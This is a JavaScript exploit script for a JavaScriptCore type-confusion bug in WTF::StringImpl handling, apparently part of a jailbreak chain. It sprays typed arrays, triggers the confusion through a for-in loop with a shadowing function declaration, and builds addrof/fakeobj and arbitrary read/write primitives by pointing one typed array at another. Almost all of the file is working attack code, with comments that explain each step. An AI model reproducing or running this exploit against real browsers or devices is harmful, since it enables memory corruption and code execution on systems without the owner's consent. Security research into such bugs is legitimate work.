// Objects used for Fakeobj and Addrof primitives
var leaker_obj = { a: 0 };
var leaker_arr = new Uint32Array(6);

// Arrays for arbitrary memory read and write
var oob_slave = new Uint8Array(1024);
var oob_master = new Uint32Array(7);

// Contains every sprayed Uint32Array (Unsigned 32-bit integer) array
// objects. By adding them here we can prevent garbage collection
let sprayed_structs = [];

//
// The purpose of spraying is to attempt to allocate an object in the 
// vicinity of the sprayed structures in memory
// 
// The choice of 0x10000 as the number of sprayed objects may be related 
// to the fact that libkernel spans approximately 0x10000 bytes, but I'm 
// not 100% sure
//
// May edit this comment if I find anything else...
//
for (let i = 0; i < 0x10000; i++) {
  let nspray = new Uint32Array(1);
  nspray[i + "spray"] = 123;
  sprayed_structs.push(nspray);
}

// The layout of our target object in memory
let target = {
  a: 2.1100820415101592e-303,
  b: false,
  c: true,
  d: 5678,
};

// Contains the current index(number) of created WTF::StringImpl
// type-confused objects. 
// 
// Increases by 32 every time the function create_impl() is called!
let impl_idx = 0;

//
// Function creates and returns a new WTF::StringImpl type-confused
// object, which is then passed to the trigger() function.
//
// Each time this function is called/used, the implIdx variable will be
// increased by 32. This variable is used to create new unique struct ids
// for the object.
//
// The created structure ids look like the following format:
// first time (0x, 1x, 2x, 3x ... 32x)
// 2nd time   (32x, 33x, 34x ... 64x)
// And so on, increasing by 32 each time.
//
function create_impl() {
  // The property <a> of ans is type-confused with m_hasAndFlags
  var ans = { a: target };
  for (var i = 0; i < 32; i++) {
    ans[impl_idx++ + "x"] = {};
  }
  return ans;
}

function trigger(x) {
  if (impl.a != target) {
    print("Unexpected state: WTF?");
    while (1);
  }
  // Property <a> of o is type-confused with m_impl
  var o = { a: 1 };
  for (var i in o) {
    {
      i = x;
      function i() {}
    }
    o[i]; // this sets bit 4 (|= 16) in m_hashAndFlags
  }
  if (impl.a != target) {
    print("corrupted!");
    print(typeof impl.a); //object
    print(impl.a.length); //5678
    target.c = leaker_obj;
    leaker_obj.a = leaker_obj;
    var l1 = impl.a[4];
    var l2 = impl.a[5];
    leaker_obj.a = oob_slave;
    var s1 = impl.a[4];
    var s2 = impl.a[5];
    target.c = leaker_arr;
    impl.a[4] = l1;
    impl.a[5] = l2;
    target.c = oob_master;
    impl.a[4] = s1;
    impl.a[5] = s2;
    impl.a = target;
    print([l1, l2, s1, s2]);
    throw "Exploit Finished!";
  }
}

try {
  for (let _ = 0; _ < 1024; _++) {
    // JSString::toIdentifier checks some bits in the type-confused structure ID, so iterate over those
    var impl = create_impl();
    trigger({ a: impl });
  }
} catch (e) {
  print("trigger() returned: " + e);
}
